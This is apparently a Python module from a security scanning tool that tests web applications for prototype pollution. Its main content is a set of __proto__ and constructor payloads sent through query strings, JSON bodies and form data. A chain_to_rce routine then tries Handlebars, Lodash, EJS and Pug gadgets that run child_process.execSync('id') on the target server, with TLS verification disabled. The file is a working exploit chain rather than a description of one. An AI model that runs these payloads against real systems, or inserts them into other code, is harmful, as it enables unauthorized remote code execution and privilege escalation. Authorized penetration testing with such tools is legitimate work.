"""
Prototype Pollution Scanner
============================
HTTP-level prototype pollution testing for server-side (Node.js) and
client-side JavaScript applications.

Techniques:
1. **Query Parameter Injection** — ?__proto__[admin]=1, ?constructor[prototype][admin]=1
2. **JSON Body Injection**        — {"__proto__": {"admin": true}}, constructor chain
3. **URL-Encoded Nested Params**  — a[__proto__][admin]=1
4. **Reflected DOM Gadget Check** — script reflection, DOM sink indicators
5. **RCE Escalation Chain**       — Handlebars/Lodash template engine gadgets
"""
from __future__ import annotations

import asyncio
import hashlib
import json
import logging
import time
import uuid
from typing import Any, Dict, List, Optional
from urllib.parse import urlencode, urlparse, urljoin

try:
    import aiohttp
    _AIOHTTP = True
except ImportError:
    _AIOHTTP = False

try:
    from .oob_engine import OOBEngine
    _OOB = True
except ImportError:
    _OOB = False

log = logging.getLogger("oneinfinity.prototype_pollution_scanner")

# ─────────────────────────────────────────────────────────────────────────────
# Query/Form Payloads
# ─────────────────────────────────────────────────────────────────────────────

_QUERY_PARAM_PAYLOADS: List[tuple] = [
    # (param_string, description)
    ("__proto__[admin]=1", "proto_query_admin"),
    ("__proto__[isAdmin]=true", "proto_query_isadmin"),
    ("constructor[prototype][admin]=1", "constructor_proto_query_admin"),
    ("constructor[prototype][role]=admin", "constructor_proto_role"),
    ("__proto__[outputFunctionName]=x;process.mainModule.require('child_process').exec('id')", "proto_rce_outputfunc"),
    ("__proto__[polluted]=yes", "proto_pollution_marker"),
    ("a[__proto__][admin]=1", "nested_proto_query"),
]

_JSON_BODY_PAYLOADS: List[tuple] = [
    # (payload_dict, description)
    ({"__proto__": {"admin": True}}, "json_proto_admin"),
    ({"__proto__": {"isAdmin": True}}, "json_proto_isadmin"),
    ({"__proto__": {"polluted": "oneinfinity_pp_marker"}}, "json_proto_marker"),
    ({"constructor": {"prototype": {"admin": True}}}, "json_constructor_admin"),
    ({"constructor": {"prototype": {"polluted": "oneinfinity_pp_marker"}}}, "json_constructor_marker"),
    ({"__proto__": {"role": "admin", "isAdmin": True}}, "json_proto_role_escalation"),
    (
        {"__proto__": {"outputFunctionName": "x;process.mainModule.require('child_process').exec('id');x"}},
        "json_proto_handlebars_rce"
    ),
    (
        {"__proto__": {"escapeFunction": "JSON.stringify; process.mainModule.require('child_process').exec('id')"}},
        "json_proto_lodash_rce"
    ),
]

_URLENCODED_PAYLOADS: List[tuple] = [
    ("a%5B__proto__%5D%5Badmin%5D=1", "urlenc_proto_admin"),
    ("a%5Bconstructor%5D%5Bprototype%5D%5Badmin%5D=1", "urlenc_constructor_admin"),
    ("__proto__%5Bpolluted%5D=pp_marker", "urlenc_proto_marker"),
]

# Indicators in responses that suggest pollution worked
_POLLUTION_INDICATORS = [
    "oneinfinity_pp_marker",
    '"admin":true',
    '"admin":"1"',
    '"isAdmin":true',
    '"polluted"',
    "UnhandledPromiseRejection",
    "TypeError: Cannot set property",
    "prototype pollution",
    "__proto__",
    "has no method",
    "Cannot read property",
]

# Server error patterns that may indicate pollution
_ERROR_INDICATORS = [
    "Internal Server Error",
    "TypeError",
    "ReferenceError",
    "Cannot set property",
    "has no method",
    "stack trace",
    "Error: ",
    "SyntaxError",
]

# RCE evidence patterns
_RCE_INDICATORS = [
    r"uid=\d+\(",
    r"gid=\d+\(",
    r"root:",
    r"daemon:",
    r"www-data",
    r"\[object Object\].*\[object Object\]",
]


def _make_finding(
    vuln_type: str,
    severity: str,
    url: str,
    payload: str,
    evidence: str,
    extra: Optional[dict] = None,
) -> dict:
    f: dict = {
        "finding_id": f"PP-{uuid.uuid4().hex[:8].upper()}",
        "vuln_type": vuln_type,
        "severity": severity,
        "url": url,
        "target": url,
        "payload": payload,
        "evidence": evidence,
        "tool": "prototype_pollution_scanner",
        "source_type": "active",
    }
    if extra:
        f.update(extra)
    return f


def _check_pollution_indicators(body: str, status: int) -> Optional[str]:
    """Return first indicator found, or None."""
    for ind in _POLLUTION_INDICATORS:
        if ind.lower() in body.lower():
            return ind
    if status >= 500:
        for err in _ERROR_INDICATORS:
            if err.lower() in body.lower():
                return f"HTTP {status}: {err}"
    return None


def _aiohttp_ssl_context():
    import ssl
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


# ─────────────────────────────────────────────────────────────────────────────
# Scanner
# ─────────────────────────────────────────────────────────────────────────────

class PrototypePollutionScanner:
    """
    HTTP-level prototype pollution injection scanner.

    Tests both server-side Node.js endpoints and client-side reflected sinks.
    """

    def __init__(self, timeout: int = 10) -> None:
        self.timeout = timeout
        self._session: Optional[Any] = None

    async def _get_session(self) -> Any:
        if not _AIOHTTP:
            raise RuntimeError("aiohttp not installed")
        if self._session is None or self._session.closed:
            connector = aiohttp.TCPConnector(ssl=_aiohttp_ssl_context())
            self._session = aiohttp.ClientSession(
                connector=connector,
                timeout=aiohttp.ClientTimeout(total=self.timeout),
            )
        return self._session

    async def close(self) -> None:
        if self._session and not self._session.closed:
            await self._session.close()

    async def _get_baseline(self, url: str) -> tuple[int, str]:
        """Fetch baseline response to compare against polluted requests."""
        try:
            session = await self._get_session()
            async with session.get(url) as resp:
                body = await resp.text(errors="replace")
                return resp.status, body
        except Exception as exc:
            log.debug("baseline fetch failed for %s: %s", url, exc)
            return 0, ""

    # ── Server-Side Prototype Pollution ──────────────────────────────────────

    async def test_server_prototype_pollution(self, url: str) -> list[dict]:
        """
        Inject prototype pollution via query params, JSON body, and
        URL-encoded nested params. Detect via response anomalies.
        """
        findings: list[dict] = []
        if not _AIOHTTP:
            log.warning("aiohttp unavailable; skipping server PP tests")
            return findings

        baseline_status, baseline_body = await self._get_baseline(url)
        session = await self._get_session()

        # 1. Query parameter injection
        for param_str, desc in _QUERY_PARAM_PAYLOADS:
            sep = "&" if "?" in url else "?"
            test_url = f"{url}{sep}{param_str}"
            try:
                async with session.get(test_url) as resp:
                    body = await resp.text(errors="replace")
                    indicator = _check_pollution_indicators(body, resp.status)
                    if indicator:
                        findings.append(_make_finding(
                            vuln_type="prototype_pollution_server",
                            severity="high",
                            url=test_url,
                            payload=param_str,
                            evidence=f"Query param pollution indicator: {indicator!r}",
                            extra={
                                "technique": "query_param",
                                "test_id": desc,
                                "http_status": resp.status,
                                "baseline_status": baseline_status,
                            },
                        ))
                    elif resp.status >= 500 and baseline_status < 500:
                        findings.append(_make_finding(
                            vuln_type="prototype_pollution_server",
                            severity="medium",
                            url=test_url,
                            payload=param_str,
                            evidence=f"Server error HTTP {resp.status} triggered by proto param (baseline {baseline_status})",
                            extra={"technique": "query_param_error", "test_id": desc},
                        ))
            except asyncio.TimeoutError:
                log.debug("timeout on query PP test %s", test_url)
            except Exception as exc:
                log.debug("query PP test error %s: %s", test_url, exc)

        # 2. JSON body injection
        headers_json = {"Content-Type": "application/json"}
        for payload_dict, desc in _JSON_BODY_PAYLOADS:
            payload_str = json.dumps(payload_dict)
            try:
                async with session.post(url, data=payload_str, headers=headers_json) as resp:
                    body = await resp.text(errors="replace")
                    indicator = _check_pollution_indicators(body, resp.status)
                    if indicator:
                        findings.append(_make_finding(
                            vuln_type="prototype_pollution_server",
                            severity="high",
                            url=url,
                            payload=payload_str,
                            evidence=f"JSON body pollution indicator: {indicator!r}",
                            extra={
                                "technique": "json_body",
                                "test_id": desc,
                                "http_status": resp.status,
                            },
                        ))
                    elif resp.status >= 500 and baseline_status < 500:
                        findings.append(_make_finding(
                            vuln_type="prototype_pollution_server",
                            severity="medium",
                            url=url,
                            payload=payload_str,
                            evidence=f"Server error HTTP {resp.status} triggered by JSON proto payload",
                            extra={"technique": "json_body_error", "test_id": desc},
                        ))
            except asyncio.TimeoutError:
                log.debug("timeout on JSON PP test %s", url)
            except Exception as exc:
                log.debug("JSON PP test error %s: %s", url, exc)

        # 3. URL-encoded nested params (PUT/PATCH often accept these)
        headers_form = {"Content-Type": "application/x-www-form-urlencoded"}
        for payload_str, desc in _URLENCODED_PAYLOADS:
            for method in ("POST", "PUT", "PATCH"):
                try:
                    async with session.request(method, url, data=payload_str, headers=headers_form) as resp:
                        body = await resp.text(errors="replace")
                        indicator = _check_pollution_indicators(body, resp.status)
                        if indicator:
                            findings.append(_make_finding(
                                vuln_type="prototype_pollution_server",
                                severity="high",
                                url=url,
                                payload=payload_str,
                                evidence=f"URL-encoded pollution indicator via {method}: {indicator!r}",
                                extra={
                                    "technique": "urlencoded",
                                    "http_method": method,
                                    "test_id": desc,
                                    "http_status": resp.status,
                                },
                            ))
                except asyncio.TimeoutError:
                    pass
                except Exception as exc:
                    log.debug("urlencoded PP %s %s: %s", method, url, exc)

        return findings

    # ── Client-Side Prototype Pollution ──────────────────────────────────────

    async def test_client_prototype_pollution(self, url: str) -> list[dict]:
        """
        Check reflected script content for prototype pollution sinks and DOM gadgets.
        Tests URL hash -> innerHTML, document.write sinks via parameter reflection.
        """
        findings: list[dict] = []
        if not _AIOHTTP:
            return findings

        # DOM sink patterns indicating client-side prototype pollution risk
        dom_sink_patterns = [
            ("innerHTML", r'\.innerHTML\s*=', "DOM sink: innerHTML assignment"),
            ("document_write", r'document\.write\s*\(', "DOM sink: document.write"),
            ("eval_sink", r'\beval\s*\(', "DOM sink: eval()"),
            ("location_hash", r'location\.hash', "DOM sink: location.hash access"),
            ("src_assign", r'\.src\s*=\s*location', "DOM sink: src from location"),
            ("json_parse_prototype", r'JSON\.parse.*__proto__', "JSON.parse with __proto__"),
            ("merge_without_check", r'Object\.assign\s*\(\s*\{', "Object.assign without prototype check"),
            ("lodash_merge", r'_\.(merge|extend|defaultsDeep)\s*\(', "Lodash deep merge sink"),
            ("jquery_extend_deep", r'\$\.extend\s*\(\s*true', "jQuery deep extend sink"),
        ]

        # Payloads that test reflection into script context
        reflection_payloads = [
            ("__proto__[polluted]=pp_test_val", "pp_test_val", "proto_reflection"),
            ("constructor[prototype][x]=pp_test_val2", "pp_test_val2", "constructor_reflection"),
        ]

        session = await self._get_session()

        # Check page source for DOM sinks
        try:
            async with session.get(url) as resp:
                body = await resp.text(errors="replace")
                import re
                for sink_id, pattern, description in dom_sink_patterns:
                    if re.search(pattern, body, re.IGNORECASE):
                        findings.append(_make_finding(
                            vuln_type="prototype_pollution_client_sink",
                            severity="medium",
                            url=url,
                            payload=pattern,
                            evidence=f"Client-side {description} found in page source",
                            extra={
                                "technique": "dom_sink_detection",
                                "sink_type": sink_id,
                            },
                        ))
        except Exception as exc:
            log.debug("client PP sink scan error %s: %s", url, exc)

        # Test parameter reflection (value reflected in response = potential pollution vector)
        for param_str, expected_val, desc in reflection_payloads:
            sep = "&" if "?" in url else "?"
            test_url = f"{url}{sep}{param_str}"
            try:
                async with session.get(test_url) as resp:
                    body = await resp.text(errors="replace")
                    if expected_val in body:
                        findings.append(_make_finding(
                            vuln_type="prototype_pollution_reflected",
                            severity="high",
                            url=test_url,
                            payload=param_str,
                            evidence=f"Pollution payload value {expected_val!r} reflected in response body",
                            extra={
                                "technique": "param_reflection",
                                "test_id": desc,
                            },
                        ))
            except Exception as exc:
                log.debug("client PP reflection test %s: %s", test_url, exc)

        return findings

    # ── RCE Escalation ───────────────────────────────────────────────────────

    async def chain_to_rce(self, finding: dict) -> Optional[dict]:
        """
        Attempt prototype pollution -> RCE escalation via known template engine gadgets.

        Targets:
        - Handlebars: __proto__.outputFunctionName code injection
        - Lodash: __proto__.escapeFunction code injection
        - EJS: __proto__.delimiter or __proto__.escape
        - Pug: __proto__.pretty
        """
        import re as _re
        url = finding.get("url", "")
        if not url or not _AIOHTTP:
            return None

        # RCE gadget payloads — these exploit known template engine PP -> RCE chains
        rce_payloads = [
            # Handlebars RCE (CVE-2019-19919 and variants)
            (
                {
                    "__proto__": {
                        "outputFunctionName": (
                            "x;global.process.mainModule.require('child_process')"
                            ".execSync('id').toString();x"
                        )
                    }
                },
                "handlebars_outputFunctionName",
            ),
            # Lodash template RCE
            (
                {
                    "__proto__": {
                        "escapeFunction": (
                            "JSON.stringify;global.process.mainModule.require('child_process')"
                            ".execSync('id').toString()"
                        )
                    }
                },
                "lodash_template_escapeFunction",
            ),
            # EJS RCE (outputFunctionName variant)
            (
                {
                    "__proto__": {
                        "outputFunctionName": (
                            "x;process.mainModule.require('child_process').execSync('id');x"
                        )
                    }
                },
                "ejs_outputFunctionName",
            ),
            # Pug/jade RCE
            (
                {
                    "__proto__": {
                        "pretty": "1\n} require('child_process').execSync('id').toString()\nif (1) {"
                    }
                },
                "pug_pretty_rce",
            ),
            # Handlebars specific — __proto__.outputFunctionName execSync (no global prefix)
            (
                {
                    "__proto__": {
                        "outputFunctionName": (
                            "x;process.mainModule.require('child_process').execSync('id')"
                        )
                    }
                },
                "handlebars_outputFunctionName_execSync",
            ),
            # Lodash — __proto__.sourceURL gadget (newline injection → execSync)
            (
                {
                    "__proto__": {
                        "sourceURL": (
                            "\n(require('child_process').execSync('id'))"
                        )
                    }
                },
                "lodash_sourceURL_execSync",
            ),
            # EJS — __proto__.outputFunctionName with return + line-comment terminator
            (
                {
                    "__proto__": {
                        "outputFunctionName": (
                            "x\nreturn require('child_process').execSync('id')\n//"
                        )
                    }
                },
                "ejs_outputFunctionName_return",
            ),
        ]

        session = await self._get_session()
        headers_json = {"Content-Type": "application/json"}

        # Use the base URL without query params for POST-based escalation
        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        for payload_dict, gadget_name in rce_payloads:
            payload_str = json.dumps(payload_dict)
            try:
                async with session.post(base_url, data=payload_str, headers=headers_json) as resp:
                    body = await resp.text(errors="replace")
                    for pattern in _RCE_INDICATORS:
                        if _re.search(pattern, body):
                            return _make_finding(
                                vuln_type="prototype_pollution_rce",
                                severity="critical",
                                url=base_url,
                                payload=payload_str,
                                evidence=f"RCE via {gadget_name} gadget — response matches: {pattern!r}",
                                extra={
                                    "technique": "pp_to_rce",
                                    "gadget": gadget_name,
                                    "original_finding_id": finding.get("finding_id"),
                                    "rce_indicator": pattern,
                                },
                            )
            except asyncio.TimeoutError:
                pass
            except Exception as exc:
                log.debug("PP RCE chain %s %s: %s", gadget_name, base_url, exc)

        return None

    # ── Orchestration ─────────────────────────────────────────────────────────

    async def scan(self, target: str) -> list[dict]:
        """
        Full prototype pollution scan: server-side, client-side, and RCE escalation.

        Parameters
        ----------
        target : str
            Base URL to scan (e.g. https://example.com/api/user).

        Returns
        -------
        list[dict]
            All findings with required keys: vuln_type, severity, url, payload,
            evidence, tool, target.
        """
        findings: list[dict] = []

        try:
            server_findings, client_findings = await asyncio.gather(
                self.test_server_prototype_pollution(target),
                self.test_client_prototype_pollution(target),
                return_exceptions=True,
            )

            if isinstance(server_findings, list):
                findings.extend(server_findings)
            elif isinstance(server_findings, Exception):
                log.debug("server PP scan error: %s", server_findings)

            if isinstance(client_findings, list):
                findings.extend(client_findings)
            elif isinstance(client_findings, Exception):
                log.debug("client PP scan error: %s", client_findings)

            # Attempt RCE escalation on any confirmed high/critical server findings
            server_confirmed = [
                f for f in findings
                if f.get("vuln_type") == "prototype_pollution_server"
                and f.get("severity") in ("high", "critical")
            ]

            rce_tasks = [self.chain_to_rce(f) for f in server_confirmed[:3]]  # limit to 3
            rce_results = await asyncio.gather(*rce_tasks, return_exceptions=True)
            for res in rce_results:
                if isinstance(res, dict):
                    findings.append(res)

        except Exception as exc:
            log.error("PrototypePollutionScanner.scan unhandled error for %s: %s", target, exc)
        finally:
            await self.close()

        return findings


# ─────────────────────────────────────────────────────────────────────────────
# Convenience
# ─────────────────────────────────────────────────────────────────────────────

async def scan_prototype_pollution(target: str, timeout: int = 10) -> list[dict]:
    """Async convenience wrapper."""
    scanner = PrototypePollutionScanner(timeout=timeout)
    return await scanner.scan(target)
